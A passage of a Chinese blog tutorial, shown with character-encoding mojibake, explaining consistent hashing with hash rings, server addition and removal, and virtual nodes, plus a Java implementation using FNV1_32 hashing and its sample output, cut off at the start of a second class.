href="https://link.segmentfault.com/?enc=RG7tKAKVADc9fpKakrdiRQ==.UcFp0gh5jKC5N/gfqMjNu53qLXwyfZK9GkwXM27y1YEAAmf/dJ7XzsPPcuI+4CKGK6p0j2c0IRQAQqUvNQBYfs+yBpIOQ8GIWTNlF5q1m2g=">å“ˆå¸Œè¡¨</a>ï¼ˆDistributed Hash Tableï¼ŒDHTï¼‰ä¸­å­˜åœ¨çš„åŠ¨æ€ä¼¸ç¼©ç­‰é—®é¢˜ ã€‚</p>
<h4 id="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¼˜ç‚¹"><a href="#ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¼˜ç‚¹" class="headerlink" title="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¼˜ç‚¹"></a>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¼˜ç‚¹</h4><ul>
<li><p>å¯æ‰©å±•æ€§ã€‚ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¿è¯äº†å¢åŠ æˆ–å‡å°‘æœåŠ¡å™¨æ—¶ï¼Œæ•°æ®å­˜å‚¨çš„æ”¹å˜æœ€å°‘ï¼Œç›¸æ¯”ä¼ ç»Ÿå“ˆå¸Œç®—æ³•å¤§å¤§èŠ‚çœäº†æ•°æ®ç§»åŠ¨çš„å¼€é”€ ã€‚</p>
</li>
<li><p>æ›´å¥½åœ°é€‚åº”æ•°æ®çš„å¿«é€Ÿå¢é•¿ã€‚é‡‡ç”¨ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•åˆ†å¸ƒæ•°æ®ï¼Œå½“æ•°æ®ä¸æ–­å¢é•¿æ—¶ï¼Œéƒ¨åˆ†è™šæ‹ŸèŠ‚ç‚¹ä¸­å¯èƒ½åŒ…å«å¾ˆå¤šæ•°æ®ã€é€ æˆæ•°æ®åœ¨è™šæ‹ŸèŠ‚ç‚¹ä¸Šåˆ†å¸ƒä¸å‡è¡¡ï¼Œæ­¤æ—¶å¯ä»¥å°†åŒ…å«æ•°æ®å¤šçš„è™šæ‹ŸèŠ‚ç‚¹åˆ†è£‚ï¼Œè¿™ç§åˆ†è£‚ä»…ä»…æ˜¯å°†åŸæœ‰çš„è™šæ‹ŸèŠ‚ç‚¹ä¸€åˆ†ä¸ºäºŒã€ä¸éœ€è¦å¯¹å…¨éƒ¨çš„æ•°æ®è¿›è¡Œé‡æ–°å“ˆå¸Œå’Œåˆ’åˆ†ã€‚</p>
<p>è™šæ‹ŸèŠ‚ç‚¹åˆ†è£‚åï¼Œå¦‚æœç‰©ç†æœåŠ¡å™¨çš„è´Ÿè½½ä»ç„¶ä¸å‡è¡¡ï¼Œåªéœ€åœ¨æœåŠ¡å™¨ä¹‹é—´è°ƒæ•´éƒ¨åˆ†è™šæ‹ŸèŠ‚ç‚¹çš„å­˜å‚¨åˆ†å¸ƒã€‚è¿™æ ·å¯ä»¥éšæ•°æ®çš„å¢é•¿è€ŒåŠ¨æ€çš„æ‰©å±•ç‰©ç†æœåŠ¡å™¨çš„æ•°é‡ï¼Œä¸”ä»£ä»·è¿œæ¯”ä¼ ç»Ÿå“ˆå¸Œç®—æ³•é‡æ–°åˆ†å¸ƒæ‰€æœ‰æ•°æ®è¦å°å¾ˆå¤šã€‚</p>
</li>
</ul>
<h4 id="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¸å“ˆå¸Œç®—æ³•çš„å…³ç³»"><a href="#ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¸å“ˆå¸Œç®—æ³•çš„å…³ç³»" class="headerlink" title="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¸å“ˆå¸Œç®—æ³•çš„å…³ç³»"></a>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¸å“ˆå¸Œç®—æ³•çš„å…³ç³»</h4><p>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•æ˜¯åœ¨å“ˆå¸Œç®—æ³•åŸºç¡€ä¸Šæå‡ºçš„ï¼Œåœ¨åŠ¨æ€å˜åŒ–çš„åˆ†å¸ƒå¼ç¯å¢ƒä¸­ï¼Œå“ˆå¸Œç®—æ³•åº”è¯¥æ»¡è¶³çš„å‡ ä¸ªæ¡ä»¶ï¼šå¹³è¡¡æ€§ã€å•è°ƒæ€§å’Œåˆ†æ•£æ€§ã€‚</p>
<ul>
<li>å¹³è¡¡æ€§ï¼šæ˜¯æŒ‡ hash çš„ç»“æœåº”è¯¥å¹³å‡åˆ†é…åˆ°å„ä¸ªèŠ‚ç‚¹ï¼Œè¿™æ ·ä»ç®—æ³•ä¸Šè§£å†³äº†è´Ÿè½½å‡è¡¡é—®é¢˜ã€‚</li>
<li>å•è°ƒæ€§ï¼šæ˜¯æŒ‡åœ¨æ–°å¢æˆ–è€…åˆ å‡èŠ‚ç‚¹æ—¶ï¼Œä¸å½±å“ç³»ç»Ÿæ­£å¸¸è¿è¡Œã€‚</li>
<li>åˆ†æ•£æ€§ï¼šæ˜¯æŒ‡æ•°æ®åº”è¯¥åˆ†æ•£åœ°å­˜æ”¾åœ¨åˆ†å¸ƒå¼é›†ç¾¤ä¸­çš„å„ä¸ªèŠ‚ç‚¹ï¼ˆèŠ‚ç‚¹è‡ªå·±å¯ä»¥æœ‰å¤‡ä»½ï¼‰ï¼Œä¸å¿…æ¯ä¸ªèŠ‚ç‚¹éƒ½å­˜å‚¨æ‰€æœ‰çš„æ•°æ®ã€‚</li>
</ul>
<h3 id="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•åŸç†"><a href="#ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•åŸç†" class="headerlink" title="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•åŸç†"></a>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•åŸç†</h3><p>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•é€šè¿‡ä¸€ä¸ªå«ä½œä¸€è‡´æ€§å“ˆå¸Œç¯çš„æ•°æ®ç»“æ„å®ç°ã€‚è¿™ä¸ªç¯çš„èµ·ç‚¹æ˜¯ 0ï¼Œç»ˆç‚¹æ˜¯ 2^32 - 1ï¼Œå¹¶ä¸”èµ·ç‚¹ä¸ç»ˆç‚¹è¿æ¥ï¼Œæ•…è¿™ä¸ªç¯çš„æ•´æ•°åˆ†å¸ƒèŒƒå›´æ˜¯ [0, 2^32-1]ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242630.jpeg" alt="hash-ring.jpg"></p>
<h4 id="å°†å¯¹è±¡æ”¾ç½®åˆ°å“ˆå¸Œç¯"><a href="#å°†å¯¹è±¡æ”¾ç½®åˆ°å“ˆå¸Œç¯" class="headerlink" title="å°†å¯¹è±¡æ”¾ç½®åˆ°å“ˆå¸Œç¯"></a>å°†å¯¹è±¡æ”¾ç½®åˆ°å“ˆå¸Œç¯</h4><p>å‡è®¾æˆ‘ä»¬æœ‰ â€œsemlinkerâ€ã€â€kakuqoâ€ã€â€loloâ€ã€â€ferâ€ å››ä¸ªå¯¹è±¡ï¼Œåˆ†åˆ«ç®€å†™ä¸º o1ã€o2ã€o3 å’Œ o4ï¼Œç„¶åä½¿ç”¨å“ˆå¸Œå‡½æ•°è®¡ç®—è¿™ä¸ªå¯¹è±¡çš„ hash å€¼ï¼Œå€¼çš„èŒƒå›´æ˜¯ [0, 2^32-1]ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242914.jpeg" alt="hash-ring-hash-objects.jpg"></p>
<p>å›¾ä¸­å¯¹è±¡çš„æ˜ å°„å…³ç³»å¦‚ä¸‹ï¼š</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">hash(o1) <span class="operator">=</span> k1<span class="comment">; hash(o2) = k2;</span></span><br><span class="line">hash(o3) <span class="operator">=</span> k3<span class="comment">; hash(o4) = k4;</span></span><br></pre></td></tr></table></figure>

<h4 id="å°†æœåŠ¡å™¨æ”¾ç½®åˆ°å“ˆå¸Œç¯"><a href="#å°†æœåŠ¡å™¨æ”¾ç½®åˆ°å“ˆå¸Œç¯" class="headerlink" title="å°†æœåŠ¡å™¨æ”¾ç½®åˆ°å“ˆå¸Œç¯"></a>å°†æœåŠ¡å™¨æ”¾ç½®åˆ°å“ˆå¸Œç¯</h4><p>æ¥ç€ä½¿ç”¨åŒæ ·çš„å“ˆå¸Œå‡½æ•°ï¼Œæˆ‘ä»¬å°†æœåŠ¡å™¨ä¹Ÿæ”¾ç½®åˆ°å“ˆå¸Œç¯ä¸Šï¼Œå¯ä»¥é€‰æ‹©æœåŠ¡å™¨çš„ IP æˆ–ä¸»æœºåä½œä¸ºé”®è¿›è¡Œå“ˆå¸Œï¼Œè¿™æ ·æ¯å°æœåŠ¡å™¨å°±èƒ½ç¡®å®šå…¶åœ¨å“ˆå¸Œç¯ä¸Šçš„ä½ç½®ã€‚è¿™é‡Œå‡è®¾æˆ‘ä»¬æœ‰ 3 å°ç¼“å­˜æœåŠ¡å™¨ï¼Œåˆ†åˆ«ä¸º cs1ã€cs2 å’Œ cs3ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242225.jpeg" alt="hash-ring-hash-servers.jpg"></p>
<p>å›¾ä¸­æœåŠ¡å™¨çš„æ˜ å°„å…³ç³»å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">hash</span>(cs1) = t1; <span class="built_in">hash</span>(cs2) = t2; <span class="built_in">hash</span>(cs3) = t3; <span class="comment"># Cache Server</span></span><br></pre></td></tr></table></figure>

<h4 id="ä¸ºå¯¹è±¡é€‰æ‹©æœåŠ¡å™¨"><a href="#ä¸ºå¯¹è±¡é€‰æ‹©æœåŠ¡å™¨" class="headerlink" title="ä¸ºå¯¹è±¡é€‰æ‹©æœåŠ¡å™¨"></a>ä¸ºå¯¹è±¡é€‰æ‹©æœåŠ¡å™¨</h4><p><strong>å°†å¯¹è±¡å’ŒæœåŠ¡å™¨éƒ½æ”¾ç½®åˆ°åŒä¸€ä¸ªå“ˆå¸Œç¯åï¼Œåœ¨å“ˆå¸Œç¯ä¸Šé¡ºæ—¶é’ˆæŸ¥æ‰¾è·ç¦»è¿™ä¸ªå¯¹è±¡çš„ hash å€¼æœ€è¿‘çš„æœºå™¨ï¼Œå³æ˜¯è¿™ä¸ªå¯¹è±¡æ‰€å±çš„æœºå™¨ã€‚</strong> ä»¥ o2 å¯¹è±¡ä¸ºä¾‹ï¼Œé¡ºåºé’ˆæ‰¾åˆ°æœ€è¿‘çš„æœºå™¨æ˜¯ cs2ï¼Œæ•…æœåŠ¡å™¨ cs2 ä¼šç¼“å­˜ o2 å¯¹è±¡ã€‚è€ŒæœåŠ¡å™¨ cs1 åˆ™ç¼“å­˜ o1ï¼Œo3 å¯¹è±¡ï¼ŒæœåŠ¡å™¨ cs3 åˆ™ç¼“å­˜ o4 å¯¹è±¡ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242456.jpeg" alt="hash-ring-objects-servers.jpg"></p>
<h4 id="æœåŠ¡å™¨å¢åŠ çš„æƒ…å†µ"><a href="#æœåŠ¡å™¨å¢åŠ çš„æƒ…å†µ" class="headerlink" title="æœåŠ¡å™¨å¢åŠ çš„æƒ…å†µ"></a>æœåŠ¡å™¨å¢åŠ çš„æƒ…å†µ</h4><p>å‡è®¾ç”±äºä¸šåŠ¡éœ€è¦ï¼Œæˆ‘ä»¬éœ€è¦å¢åŠ ä¸€å°æœåŠ¡å™¨ cs4ï¼Œç»è¿‡åŒæ ·çš„ hash è¿ç®—ï¼Œè¯¥æœåŠ¡å™¨æœ€ç»ˆè½äº t1 å’Œ t2 æœåŠ¡å™¨ä¹‹é—´ï¼Œå…·ä½“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242695.jpeg" alt="hash-ring-add-server.jpg"></p>
<p>å¯¹äºä¸Šè¿°çš„æƒ…å†µï¼Œåªæœ‰ t1 å’Œ t2 æœåŠ¡å™¨ä¹‹é—´çš„å¯¹è±¡éœ€è¦é‡æ–°åˆ†é…ã€‚åœ¨ä»¥ä¸Šç¤ºä¾‹ä¸­åªæœ‰ o3 å¯¹è±¡éœ€è¦é‡æ–°åˆ†é…ï¼Œå³å®ƒè¢«é‡æ–°åˆ° cs4 æœåŠ¡å™¨ã€‚åœ¨å‰é¢æˆ‘ä»¬å·²ç»åˆ†æè¿‡ï¼Œå¦‚æœä½¿ç”¨ç®€å•çš„å–æ¨¡æ–¹æ³•ï¼Œå½“æ–°æ·»åŠ æœåŠ¡å™¨æ—¶å¯èƒ½ä¼šå¯¼è‡´å¤§éƒ¨åˆ†ç¼“å­˜å¤±æ•ˆï¼Œè€Œä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•åï¼Œè¿™ç§æƒ…å†µå¾—åˆ°äº†è¾ƒå¤§çš„æ”¹å–„ï¼Œå› ä¸ºåªæœ‰å°‘éƒ¨åˆ†å¯¹è±¡éœ€è¦é‡æ–°åˆ†é…ã€‚</p>
<h4 id="æœåŠ¡å™¨å‡å°‘çš„æƒ…å†µ"><a href="#æœåŠ¡å™¨å‡å°‘çš„æƒ…å†µ" class="headerlink" title="æœåŠ¡å™¨å‡å°‘çš„æƒ…å†µ"></a>æœåŠ¡å™¨å‡å°‘çš„æƒ…å†µ</h4><p>å‡è®¾ cs3 æœåŠ¡å™¨å‡ºç°æ•…éšœå¯¼è‡´æœåŠ¡ä¸‹çº¿ï¼Œè¿™æ—¶åŸæœ¬å­˜å‚¨äº cs3 æœåŠ¡å™¨çš„å¯¹è±¡ o4ï¼Œéœ€è¦è¢«é‡æ–°åˆ†é…è‡³ cs2 æœåŠ¡å™¨ï¼Œå…¶å®ƒå¯¹è±¡ä»å­˜å‚¨åœ¨åŸæœ‰çš„æœºå™¨ä¸Šã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242920.jpeg" alt="hash-ring-remove-server.jpg"></p>
<h4 id="è™šæ‹ŸèŠ‚ç‚¹"><a href="#è™šæ‹ŸèŠ‚ç‚¹" class="headerlink" title="è™šæ‹ŸèŠ‚ç‚¹"></a>è™šæ‹ŸèŠ‚ç‚¹</h4><p>è™šæ‹ŸèŠ‚ç‚¹å¯ä»¥è§£å†³æ•°æ®å€¾æ–œçš„é—®é¢˜ã€‚</p>
<p>æ–°å¢çš„æœåŠ¡å™¨ cs4 åªåˆ†æ‹…äº† cs1 æœåŠ¡å™¨çš„è´Ÿè½½ï¼ŒæœåŠ¡å™¨ cs2 å’Œ cs3 å¹¶æ²¡æœ‰å› ä¸º cs4 æœåŠ¡å™¨çš„åŠ å…¥è€Œå‡å°‘è´Ÿè½½å‹åŠ›ã€‚å¦‚æœ cs4 æœåŠ¡å™¨çš„æ€§èƒ½ä¸åŸæœ‰æœåŠ¡å™¨çš„æ€§èƒ½ä¸€è‡´ç”šè‡³å¯èƒ½æ›´é«˜ï¼Œé‚£ä¹ˆè¿™ç§ç»“æœå¹¶ä¸æ˜¯æ‰€æœŸæœ›çš„ã€‚</p>
<p>ä¸ºæ­¤ï¼Œå¯ä»¥å¼•å…¥è™šæ‹ŸèŠ‚ç‚¹æ¥è§£å†³è´Ÿè½½ä¸å‡è¡¡çš„é—®é¢˜ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå‡å¦‚å¼€å§‹æ—¶å­˜åœ¨ç¼“å­˜æœºå™¨c1ï¼Œc2ï¼Œc3ï¼Œå¯¹äºæ¯ä¸ªç¼“å­˜æœºå™¨ï¼Œéƒ½æœ‰3ä¸ªè™šæ‹ŸèŠ‚ç‚¹å¯¹åº”ï¼Œå…¶ä¸€è‡´æ€§hashç¯ç»“æ„å¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282308149.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"> </p>
<p>å‡è®¾å¯¹äºå¯¹è±¡o1ï¼Œå…¶å¯¹åº”çš„è™šæ‹ŸèŠ‚ç‚¹ä¸ºc11ï¼Œè€Œè™šæ‹ŸèŠ‚ç‚¹c11å¯¹è±¡ç¼“å­˜æœºå™¨c1ï¼Œæ•…å¯¹è±¡o1è¢«åˆ†é…åˆ°æœºå™¨c1ä¸­ã€‚</p>
<p>æ–°åŠ å…¥ç¼“å­˜æœºå™¨c4ï¼Œå…¶å¯¹åº”çš„è™šæ‹ŸèŠ‚ç‚¹ä¸ºc41ï¼Œc42ï¼Œc43ï¼Œå°†è¿™ä¸‰ä¸ªè™šæ‹ŸèŠ‚ç‚¹æ·»åŠ åˆ°hashç¯ä¸­ï¼Œå¾—åˆ°çš„hashç¯ç»“æ„å¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282308204.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"> </p>
<p>æ–°åŠ å…¥çš„ç¼“å­˜æœºå™¨c4å¯¹åº”ä¸€ç»„è™šæ‹ŸèŠ‚ç‚¹c41ï¼Œc42ï¼Œc43ï¼ŒåŠ å…¥åˆ°hashç¯åï¼Œå½±å“çš„è™šæ‹ŸèŠ‚ç‚¹åŒ…æ‹¬c31ï¼Œc22ï¼Œc11ï¼ˆé¡ºæ—¶é’ˆæŸ¥æ‰¾åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼‰ï¼Œè€Œè¿™3ä¸ªè™šæ‹ŸèŠ‚ç‚¹åˆ†åˆ«å¯¹åº”æœºå™¨c3ï¼Œc2ï¼Œc1ã€‚å³æ–°åŠ å…¥çš„ä¸€å°æœºå™¨ï¼ŒåŒæ—¶å½±å“åˆ°åŸæœ‰çš„3å°æœºå™¨ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæ–°åŠ å…¥çš„æœºå™¨å¹³ç­‰åœ°åˆ†æ‹…äº†åŸæœ‰æœºå™¨çš„è´Ÿè½½ï¼Œè¿™æ­£æ˜¯è™šæ‹ŸèŠ‚ç‚¹å¸¦æ¥çš„å¥½å¤„ã€‚è€Œä¸”æ–°åŠ å…¥æœºå™¨c4åï¼Œåªå½±å“25%ï¼ˆ1&#x2F;4ï¼‰å¯¹è±¡åˆ†é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå‘½ä¸­ç‡ä»ç„¶æœ‰75%ï¼Œè¿™è·Ÿæ²¡æœ‰ä½¿ç”¨è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§hashç®—æ³•å¾—åˆ°çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚</p>
<h3 id="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å®ç°"><a href="#ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å®ç°" class="headerlink" title="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å®ç°"></a>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å®ç°</h3><h4 id="ä¸å¸¦è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å®ç°"><a href="#ä¸å¸¦è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å®ç°" class="headerlink" title="ä¸å¸¦è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å®ç°"></a>ä¸å¸¦è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å®ç°</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.SortedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsistentHashingWithoutVirtualNode</span> &#123;</span><br><span class="line">    <span class="comment">//å¾…æ·»åŠ å…¥Hashç¯çš„æœåŠ¡å™¨åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String[] servers = &#123;<span class="string">&quot;192.168.0.1:8888&quot;</span>, <span class="string">&quot;192.168.0.2:8888&quot;</span>, </span><br><span class="line">      <span class="string">&quot;192.168.0.3:8888&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//keyè¡¨ç¤ºæœåŠ¡å™¨çš„hashå€¼ï¼Œvalueè¡¨ç¤ºæœåŠ¡å™¨</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SortedMap&lt;Integer, String&gt; sortedMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;Integer, String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç¨‹åºåˆå§‹åŒ–ï¼Œå°†æ‰€æœ‰çš„æœåŠ¡å™¨æ”¾å…¥sortedMapä¸­</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; servers.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> getHash(servers[i]);</span><br><span class="line">            System.out.println(<span class="string">&quot;[&quot;</span> + servers[i] + <span class="string">&quot;]åŠ å…¥é›†åˆä¸­, å…¶Hashå€¼ä¸º&quot;</span> + hash);</span><br><span class="line">            sortedMap.put(hash, servers[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¾—åˆ°åº”å½“è·¯ç”±åˆ°çš„ç»“ç‚¹</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getServer</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="comment">//å¾—åˆ°è¯¥keyçš„hashå€¼</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> getHash(key);</span><br><span class="line">        <span class="comment">//å¾—åˆ°å¤§äºè¯¥Hashå€¼çš„æ‰€æœ‰Map</span></span><br><span class="line">        SortedMap&lt;Integer, String&gt; subMap = sortedMap.tailMap(hash);</span><br><span class="line">        <span class="keyword">if</span> (subMap.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœæ²¡æœ‰æ¯”è¯¥keyçš„hashå€¼å¤§çš„ï¼Œåˆ™ä»ç¬¬ä¸€ä¸ªnodeå¼€å§‹</span></span><br><span class="line">            <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> sortedMap.firstKey();</span><br><span class="line">            <span class="comment">//è¿”å›å¯¹åº”çš„æœåŠ¡å™¨</span></span><br><span class="line">            <span class="keyword">return</span> sortedMap.get(i);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//ç¬¬ä¸€ä¸ªKeyå°±æ˜¯é¡ºæ—¶é’ˆè¿‡å»ç¦»nodeæœ€è¿‘çš„é‚£ä¸ªç»“ç‚¹</span></span><br><span class="line">            <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> subMap.firstKey();</span><br><span class="line">            <span class="comment">//è¿”å›å¯¹åº”çš„æœåŠ¡å™¨</span></span><br><span class="line">            <span class="keyword">return</span> subMap.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä½¿ç”¨FNV1_32_HASHç®—æ³•è®¡ç®—æœåŠ¡å™¨çš„Hashå€¼</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getHash</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> <span class="number">16777619</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> (<span class="type">int</span>) <span class="number">2166136261L</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++)</span><br><span class="line">            hash = (hash ^ str.charAt(i)) * p;</span><br><span class="line">        hash += hash &lt;&lt; <span class="number">13</span>;</span><br><span class="line">        hash ^= hash &gt;&gt; <span class="number">7</span>;</span><br><span class="line">        hash += hash &lt;&lt; <span class="number">3</span>;</span><br><span class="line">        hash ^= hash &gt;&gt; <span class="number">17</span>;</span><br><span class="line">        hash += hash &lt;&lt; <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœç®—å‡ºæ¥çš„å€¼ä¸ºè´Ÿæ•°åˆ™å–å…¶ç»å¯¹å€¼</span></span><br><span class="line">        <span class="keyword">if</span> (hash &lt; <span class="number">0</span>)</span><br><span class="line">            hash = Math.abs(hash);</span><br><span class="line">        <span class="keyword">return</span> hash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String[] keys = &#123;<span class="string">&quot;semlinker&quot;</span>, <span class="string">&quot;kakuqo&quot;</span>, <span class="string">&quot;fer&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; keys.length; i++)</span><br><span class="line">            System.out.println(<span class="string">&quot;[&quot;</span> + keys[i] + <span class="string">&quot;]çš„hashå€¼ä¸º&quot;</span> + getHash(keys[i])</span><br><span class="line">                    + <span class="string">&quot;, è¢«è·¯ç”±åˆ°ç»“ç‚¹[&quot;</span> + getServer(keys[i]) + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šä»£ç æˆåŠŸè¿è¡Œåï¼Œåœ¨æ§åˆ¶å°ä¼šè¾“å‡ºä»¥ä¸‹ç»“æœï¼š</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">[<span class="number">192.168.0.1</span>:<span class="number">8888</span>]åŠ å…¥é›†åˆä¸­, å…¶Hashå€¼ä¸º<span class="number">1326271016</span></span><br><span class="line">[<span class="number">192.168.0.2</span>:<span class="number">8888</span>]åŠ å…¥é›†åˆä¸­, å…¶Hashå€¼ä¸º<span class="number">1132535844</span></span><br><span class="line">[<span class="number">192.168.0.3</span>:<span class="number">8888</span>]åŠ å…¥é›†åˆä¸­, å…¶Hashå€¼ä¸º<span class="number">115798597</span></span><br><span class="line"></span><br><span class="line">[semlinker]çš„hashå€¼ä¸º<span class="number">1549041406</span>, è¢«è·¯ç”±åˆ°ç»“ç‚¹[<span class="number">192.168.0.3</span>:<span class="number">8888</span>]</span><br><span class="line">[kakuqo]çš„hashå€¼ä¸º<span class="number">463104755</span>, è¢«è·¯ç”±åˆ°ç»“ç‚¹[<span class="number">192.168.0.2</span>:<span class="number">8888</span>]</span><br><span class="line">[fer]çš„hashå€¼ä¸º<span class="number">1677150790</span>, è¢«è·¯ç”±åˆ°ç»“ç‚¹[<span class="number">192.168.0.3</span>:<span class="number">8888</span>]</span><br></pre></td></tr></table></figure>



<h4 id="ä¸å¸¦è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å®ç°-1"><a href="#ä¸å¸¦è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å®ç°-1" class="headerlink" title="ä¸å¸¦è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å®ç°"></a>ä¸å¸¦è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å®ç°</h4><p>å¸¦è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å¯ä»¥å‚è€ƒ <a href="https://link.segmentfault.com/?enc=upWwPl9YvlX5SiwVBKgQiA==.XEp7/IKgaClPvsi19twzlol5KfSc32CwQDGxBmaGs2vDqAZIqR54XQm3ELi4970rmWNK3Nw4w99jlazmI2uMIg==">ä¸€è‡´æ€§Hash(Consistent Hashing)åŸç†å‰–æåŠJavaå®ç°</a> ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> hash;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.SortedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang.StringUtils;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * å¸¦è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§Hashç®—æ³•</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsistentHashingWithoutVirtualNode</span> 